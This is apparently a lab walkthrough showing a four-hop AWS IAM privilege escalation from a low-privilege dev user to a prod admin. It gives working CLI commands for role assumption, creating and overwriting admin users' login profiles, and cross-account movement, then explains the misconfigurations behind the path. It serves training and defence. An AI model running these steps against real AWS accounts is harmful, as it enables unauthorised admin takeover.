# Guided Walkthrough: Multi-Hop Cross-Account Privilege Escalation (Both Sides)

The attack path shows how a dev user can escalate to admin privileges across both dev and prod accounts through a series of role assumptions and login profile manipulations.

This attack demonstrates a critical multi-hop privilege escalation vulnerability. A dev user can access prod resources through login profile manipulation. The multi-hop nature of this attack chain spans multiple accounts, ultimately granting full admin access in both dev and prod accounts.

This configuration appears in real environments where teams share helpdesk roles across account boundaries without fully auditing the downstream privilege chains that those roles enable. The cross-account trust relationship combined with unconstrained login profile permissions creates a path that may not be obvious from a single-account policy review.

## The Challenge

You start as `pl-pathfinding-starting-user-dev` in the dev account — a low-privilege user with `sts:AssumeRole` permission on the `pl-helpdesk` role. Your goal is to gain full administrative access to the prod account by compromising `pl-Jeremy`, an admin IAM user in prod.

The path is four hops: dev starting user → helpdesk role (dev) → Josh admin user (dev) → trustsdev role (prod) → Jeremy admin user (prod).

## Reconnaissance

Before diving in, confirm your identity and note the dev account ID — you will need it to construct role ARNs.

```bash
export AWS_PROFILE=dev
aws sts get-caller-identity
```

With your helpful permissions, explore what users exist and whether any have login profiles already configured:

```bash
aws iam list-users
aws iam get-login-profile --user-name pl-Josh 2>&1
```

If `pl-Josh` does not yet have a login profile, that is your opening.

## Exploitation

### Hop 1: Assume the helpdesk role in dev

The starting user's trust relationship with `pl-helpdesk` is the entry point. Assume the role to pick up its permissions, including `iam:CreateLoginProfile` scoped to `pl-Josh`.

```bash
HELPDESK_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{DEV_ACCOUNT}:role/pl-helpdesk" \
  --role-session-name "helpdesk-session")
export AWS_ACCESS_KEY_ID=$(echo $HELPDESK_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $HELPDESK_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $HELPDESK_CREDS | jq -r '.Credentials.SessionToken')
```

### Hop 2: Create a login profile for pl-Josh (dev admin)

As the helpdesk role, you can now set a console password for `pl-Josh`. This effectively gives you control of a dev admin account.

```bash
aws iam create-login-profile \
  --user-name pl-Josh \
  --password "Pathfinding@Labs1!" \
  --no-password-reset-required
```

You now have credentials for an admin user in dev. Unset the helpdesk session credentials and authenticate as Josh (via the console or by using Josh's long-term credentials if accessible).

```bash
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN
```

### Hop 3: Cross-account lateral movement — assume pl-trustsdev in prod

Josh's admin permissions in dev include the ability to assume the `pl-trustsdev` role in the prod account. The trust policy on that role explicitly allows principals from the dev account.

```bash
# Authenticate as pl-Josh, then:
TRUSTSDEV_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{PROD_ACCOUNT}:role/pl-trustsdev" \
  --role-session-name "trustsdev-session")
export AWS_ACCESS_KEY_ID=$(echo $TRUSTSDEV_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $TRUSTSDEV_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $TRUSTSDEV_CREDS | jq -r '.Credentials.SessionToken')
```

You are now operating in the prod account as `pl-trustsdev`.

### Hop 4: Update pl-Jeremy's login profile in prod

The `pl-trustsdev` role holds `iam:UpdateLoginProfile` on `pl-Jeremy`, a prod admin user. Set a known password to complete the escalation.

```bash
aws iam update-login-profile \
  --user-name pl-Jeremy \
  --password "Pathfinding@Labs1!" \
  --no-password-reset-required
```

## Verification

Authenticate to the AWS console (or obtain Jeremy's long-term credentials) and confirm administrative access:

```bash
aws sts get-caller-identity
aws iam list-users
aws s3 ls
```

All three calls should succeed, confirming you hold admin-level permissions in the prod account.

## What Happened

Starting from a low-privilege dev user, you chained four hops across two AWS accounts to reach prod admin. The critical enablers were: an overly permissive helpdesk role that could create login profiles for admin users, and a cross-account trust relationship that allowed a dev admin to assume a role in prod. Neither misconfiguration is individually catastrophic, but together they form a complete privilege escalation path invisible to single-account policy reviews.

In real environments, this pattern surfaces when helpdesk or IT operations roles are given broad IAM management permissions without considering the downstream blast radius, and when cross-account trusts are established without verifying that the trusted account's principals have been hardened against privilege escalation.
